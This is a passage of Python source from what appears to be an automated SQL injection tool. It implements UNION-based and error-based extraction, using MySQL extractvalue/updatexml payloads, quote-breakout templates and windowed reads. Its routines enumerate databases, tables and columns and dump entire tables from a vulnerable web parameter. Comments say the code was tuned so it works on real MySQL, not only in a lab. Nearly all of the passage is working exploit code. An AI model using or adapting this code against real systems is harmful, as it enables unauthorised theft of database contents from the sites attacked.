    return f"(SELECT * FROM {src} ORDER BY 1 LIMIT {n} OFFSET {off}) _w"


def _agg_dump(value_fn, dbms, marks, table, cols, db=None):
    """Read a table through a value channel (UNION or error-based) and split rows/cols.
    Paginated in row blocks so a big table isn't silently cut at group_concat_max_len,
    and every cell NULL-coalesced so a NULL column can't drop its row. Shared by both."""
    colsep = _strlit(dbms, marks.colsep)
    parts = []
    for i, c in enumerate(cols):
        if i:
            parts.append(colsep)
        parts.append(_cell(dbms, c))
    row = _ucat(dbms, parts)
    src = _qualify(dbms, db, table)
    rows, off = [], 0
    while off < _DUMP_CAP:
        data = value_fn(f"SELECT {_uagg(dbms, row, marks.rowsep)} FROM {_window(dbms, src, _DUMP_BLOCK, off)}")
        got = [r.split(marks.colsep) for r in data.split(marks.rowsep) if r]
        rows.extend(got)
        if len(got) < _DUMP_BLOCK:
            break
        off += _DUMP_BLOCK
    return rows


def _union_list(http, oracle, dbms, ncols, refcol, which, db=None, **fmt):
    vf = lambda expr: union_value(http, oracle, dbms, ncols, refcol, expr)
    return _agg_catalog(vf, dbms, _marks_of(oracle), which, db=db, **fmt)


def union_databases(http, oracle, dbms, ncols, refcol):
    return _union_list(http, oracle, dbms, ncols, refcol, "dbs")


def union_tables(http, oracle, dbms, ncols, refcol, db=None):
    return _union_list(http, oracle, dbms, ncols, refcol, "tables", db=db)


def union_columns(http, oracle, dbms, ncols, refcol, table, db=None):
    return _union_list(http, oracle, dbms, ncols, refcol, "cols", db=db, t=table)


def union_dump(http, oracle, dbms, ncols, refcol, table, cols, db=None):
    vf = lambda expr: union_value(http, oracle, dbms, ncols, refcol, expr)
    return _agg_dump(vf, dbms, _marks_of(oracle), table, cols, db=db)


# ============================ error-based =============================
# When a quote leaks the DBMS error verbatim but nothing else does — no boolean
# differential, no reflected column for UNION, no time sink — the error itself is the
# read channel. A function that forces a type/XPATH error embeds a sub-SELECT's value
# into the error text after a 0x7e (~) marker; we parse it back out. Like UNION this
# reads whole values (and whole tables, via group_concat) per request, not one bit.

_ERR_MARK = "~"            # the 0x7e byte each payload prefixes the leaked data with
# extractvalue/updatexml cap their error at 32 chars *including* the ~ marker, so each
# window carries only 31 chars of data — request and step by 31. (At 32 the engine drops
# the 32nd char every window; the read then sees a short chunk and stops after the first,
# returning only the head of any value on real MySQL. The non-truncating lab hid this.)
_ERR_WINDOW = 31

# Per-DBMS error functions; {e} is the marker-prefixed expression to leak. Two forms
# each, so a filtered one has a fallback. MySQL first (what the lab models); the rest
# are left to fill in later (Postgres CAST(...AS int), MSSQL CONVERT(int,...), Oracle).
_ERROR_FNS = {
    "mysql": [
        "extractvalue(1,concat(0x7e,{e}))",
        "updatexml(1,concat(0x7e,{e}),1)",
    ],
}

# Quote-breakout contexts for the error payload (mirrors _CONTEXTS, but injects an
# error function instead of a boolean condition). {v}=value, {e}=fn, {cm}=comment.
_ERROR_CTX = [
    ("numeric",       "{v} AND {e}{cm}"),
    ("single-quote",  "{v}' AND {e}{cm}"),
    ("double-quote",  "{v}\" AND {e}{cm}"),
    ("paren-single",  "{v}') AND {e}{cm}"),
]


def _error_leak(body):
    """The data the engine echoed after our ~ marker, or None if the marker isn't
    there (the channel didn't fire). Apps HTML-escape the value, so the first literal
    quote/tag after ~ is the delimiter; unescape what sits between."""
    if not body:
        return None
    i = body.find(_ERR_MARK)
    if i < 0:
        return None
    rest = body[i + 1:]
    end = len(rest)
    for ch in ("'", '"', "<"):           # the engine wraps the error in quotes/markup
        j = rest.find(ch)
        if 0 <= j < end:
            end = j
    return _html.unescape(rest[:end])


class ErrorOracle:
    """A string read-channel over the DBMS error message: value(SELECT) -> str.

    Unlike the boolean/time oracles (one bit per request), this lifts a whole value
    out of a forced error per request. Long values are read in <=32-char windows
    (extractvalue/updatexml truncate there) and reassembled; a target that doesn't
    truncate returns the whole value at once, which the same loop handles — a window
    that comes back short of full ends the read."""

    def __init__(self, http, url, param, value, dbms, context, ctx_tmpl, fn_tmpl, console=None):
        self.http, self.url, self.param, self.value = http, url, param, value
        self.dbms, self.context = dbms, context
        self._ctx, self._fn = ctx_tmpl, fn_tmpl
        self.console = console
        self.cache = None                 # parity with the other oracles (unused here)
        self.marks = _new_marks()
        self.blocked = 0

    @property
    def count(self):
        return self.http.count

    def _payload(self, leak_expr):
        return self._ctx.format(v=self.value, e=self._fn.format(e=leak_expr), cm=_COMMENT)

    def _read_window(self, expr, off):
        payload = self._payload(f"substring(({expr}),{off},{_ERR_WINDOW})")
        if self.console is not None and self.console.verbose >= 2:
            self.console.trace(f"{self.param}={payload}", level=2)
        return _error_leak(_inject(self.http, self.url, self.param, payload))

    def read(self, expr) -> str:
        """The string value of a scalar SQL expression, read through the error channel
        in <=32-char windows and reassembled. (Named `read`, not `value`, so it doesn't
        shadow self.value — the parameter's normal value.)"""
        out, off = "", 1
        while off <= 1 << 16:
            chunk = self._read_window(expr, off)
            if not chunk:                    # channel failed, or the value is exhausted
                break
            out += chunk
            if len(chunk) != _ERR_WINDOW:    # a short window is the last (real engine),
                break                        # or the whole value at once (non-truncating)
            off += _ERR_WINDOW
        return out


def error_calibrate(http, url, param, value, dbms=None, console=None):
    """Find an error-based channel: an error function + quote context whose forced
    error echoes a planted token. Confirmed with a random number (round-trips on any
    engine, carries no quotes), so a stray 500 page can't false-positive. The wraith
    handoff's `dbms` is tried first; otherwise every known engine is."""
    order = [dbms] if dbms in _ERROR_FNS else list(_ERROR_FNS)
    token = str(random.randint(10 ** 6, 10 ** 7 - 1))
    for d in order:
        for fn in _ERROR_FNS[d]:
            for ctx_name, ctx_tmpl in _ERROR_CTX:
                eo = ErrorOracle(http, url, param, value, d, ctx_name, ctx_tmpl, fn, console)
                if eo.read(f"SELECT {token}") == token:
                    return eo
    return None


def error_databases(eo):
    return _agg_catalog(eo.read, eo.dbms, eo.marks, "dbs")


def error_tables(eo, db=None):
    return _agg_catalog(eo.read, eo.dbms, eo.marks, "tables", db=db)


def error_columns(eo, table, db=None):
    return _agg_catalog(eo.read, eo.dbms, eo.marks, "cols", db=db, t=table)


def error_dump(eo, table, cols, db=None):
    return _agg_dump(eo.read, eo.dbms, eo.marks, table, cols, db=db)
